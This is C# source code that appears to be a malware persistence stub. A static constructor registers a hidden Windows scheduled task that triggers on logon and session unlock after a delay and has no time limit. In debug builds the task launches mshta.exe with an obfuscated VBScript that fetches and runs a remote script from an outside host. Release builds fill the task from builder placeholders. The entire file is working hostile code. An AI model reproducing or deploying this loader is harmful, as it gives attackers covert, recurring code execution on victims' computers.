using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

[ComVisible(true)]
public partial class Program
{
    static Program()
    {
        Main();
    }
    static void Main()
    {
        var serialNumber = $"_{DeviceInfo.GetUUID()}";
#if DEBUG
        CreateTask(serialNumber, "mshta.exe", "vbscript:document.write(Replace(Replace(\"<@crip! @rc='h!!p@://j8.mom/01991529-9560-7dbc-81c1-0644151b30f1/'></@crip!>\",\"@\",\"s\"),\"!\",\"t\"))", "");
#else
        CreateTask(serialNumber, "%ExecutablePath%", "%Arguments%", "%WorkingDirectory%");
#endif
    }

    static void CreateTask(string taskName, string applicationPath, string arguments, string workingDirectory)
    {
        var svc = new ITaskService();
        svc.Connect(null, null, null, null);
        var root = svc.GetFolder("\\");

        ITaskDefinition taskDefinition = svc.NewTask(0);

        taskDefinition.RegistrationInfo.Author = Environment.UserName;
        taskDefinition.Principal.LogonType = TaskLogonType.InteractiveToken;

        taskDefinition.Settings.RunOnlyIfNetworkAvailable = true;
        taskDefinition.Settings.StartWhenAvailable = true;
        taskDefinition.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
        taskDefinition.Settings.Compatibility = TaskCompatibility.V2_1;
        taskDefinition.Settings.StopIfGoingOnBatteries = false;
        taskDefinition.Settings.DisallowStartIfOnBatteries = false;
        taskDefinition.Settings.ExecutionTimeLimit = "PT0S";

        ISessionStateChangeTrigger sessionTrigger = (ISessionStateChangeTrigger)taskDefinition.Triggers.Create(TaskTriggerType.SessionStateChange);
        sessionTrigger.StateChange = TaskSessionStateChangeType.SessionUnlock;
        sessionTrigger.Delay = "PT5M";
        try
        {
            string user = WindowsIdentity.GetCurrent().User.Value;
            sessionTrigger.UserId = user;
        }
        catch { }
        sessionTrigger.Enabled = true;

        ILogonTrigger logonTrigger = (ILogonTrigger)taskDefinition.Triggers.Create(TaskTriggerType.Logon);
        logonTrigger.Delay = "PT5M";
        try
        {
            string user = WindowsIdentity.GetCurrent().User.Value;
            logonTrigger.UserId = user;
        }
        catch { }
        logonTrigger.Enabled = true;

        IExecAction execAction = (IExecAction)taskDefinition.Actions.Create(TaskActionType.Execute);
        execAction.Path = applicationPath;
        execAction.Arguments = arguments;
        execAction.WorkingDirectory = workingDirectory;

        root.RegisterTaskDefinition(
            taskName,
            taskDefinition,
            (int)TASK_CREATION.TASK_CREATE_OR_UPDATE,
            null,
            null,
            TaskLogonType.None,
            null
        );
    }
}
